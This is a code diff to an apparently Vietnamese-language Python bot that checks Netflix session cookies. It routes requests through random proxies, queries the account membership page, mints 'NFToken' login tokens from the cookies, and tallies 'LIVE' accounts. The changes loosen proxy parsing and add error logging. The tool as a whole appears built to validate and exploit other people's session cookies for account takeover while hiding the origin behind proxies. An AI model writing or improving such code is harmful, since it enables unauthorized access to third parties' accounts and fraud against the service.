@@ -41,19 +41,15 @@ def _build_proxy_dict(scheme, host, port, user=None, password=None):
 def _parse_proxy_line(line):
     line = line.strip()
     if not line or line.startswith("#"): return None
-    line = re.sub(r"^([a-zA-Z][a-zA-Z0-9+.-]*):/+", r"\1://", line)
+    
+    # Tự động sửa nếu người dùng quên điền http:// hoặc https:// ở đầu file proxy thô
+    if not re.match(r'^[a-zA-Z][a-zA-Z0-9+.-]*://', line):
+        line = "http://" + line
+
     url_like = re.match(r"^(?P<scheme>https?|socks5h?|socks4a?)://(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line, flags=re.IGNORECASE)
     if url_like:
         d = url_like.groupdict()
         return _build_proxy_dict(d["scheme"].lower(), d["host"], d["port"], d.get("user"), d.get("password"))
-    userpass_hostport = re.match(r"^(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line)
-    if userpass_hostport:
-        d = userpass_hostport.groupdict()
-        return _build_proxy_dict("http", d["host"], d["port"], d["user"], d["password"])
-    hostport = re.match(r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line)
-    if hostport:
-        d = hostport.groupdict()
-        return _build_proxy_dict("http", d["host"], d["port"])
     return None
 
 def load_proxies():
@@ -63,6 +59,7 @@ def load_proxies():
             for line in f:
                 p = _parse_proxy_line(line)
                 if p: proxies.append(p)
+    print(f"📡 Đã nạp thành công {len(proxies)} Proxy từ cấu hình file.")
     return proxies
 
 def canonicalize_netflix_cookie_name(name):
@@ -242,7 +239,6 @@ def country_code_to_flag(code):
     raw = str(code or "").strip().upper()
     return "".join(chr(127397 + ord(c)) for c in raw) if len(raw) == 2 and raw.isalpha() else "🌍"
 
-# 🌐 PHẦN ĐÃ SỬA ĐỔI: ÉP BUỘC DÙNG PROXY SẠCH ĐỂ TẠO NFTOKEN TRÊN SERVER RENDER
 def create_nftoken(cookie_dict, proxy=None):
     netflix_id = decode_netflix_value(cookie_dict.get("NetflixId"))
     if not netflix_id: return None
@@ -254,7 +250,10 @@ def create_nftoken(cookie_dict, proxy=None):
         if r.status_code == 200:
             tk = r.json().get("value", {}).get("account", {}).get("token", {}).get("default", {}).get("token")
             if tk: return {"token": tk}
-    except: pass
+        else:
+            print(f"⚠️ Hệ thống NFToken trả về mã lỗi HTTP: {r.status_code}")
+    except Exception as e:
+        print(f"⚠️ Lỗi kết nối khi gọi API NFToken: {str(e)}")
     return None
 
 # =========================================================================
@@ -337,6 +336,8 @@ def process_cookie_data(raw_content, source_name, original_msg, progress_msg):
             
             # Chọn proxy ngẫu nhiên từ file proxy.txt
             proxy = random.choice(proxies) if proxies else None
+            if not proxy:
+                print("⚠️ Cảnh báo: Không tìm thấy Proxy hợp lệ. Đang gọi trực tiếp bằng mạng máy chủ.")
             
             try:
                 r = session.get("https://www.netflix.com/account/membership", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, proxies=proxy, timeout=12)
@@ -374,8 +375,8 @@ def process_cookie_data(raw_content, source_name, original_msg, progress_msg):
                     )
                     success_count += 1
                     continue
-            except:
-                pass
+            except Exception as check_err:
+                print(f"⚠️ Lỗi kết nối tài khoản: {str(check_err)}")
             final_report += f"❌ **Tài khoản #{idx+1}:** Cookie Die hoặc bị lỗi cấu hình Proxy.\n\n"
 
         header = f"📊 **KẾT QUẢ CHECK COOKIE**\n📦 Nguồn: {source_name}\n✅ LIVE/FREE: {success_count}/{len(bundles)}\n----------------------------------------\n"
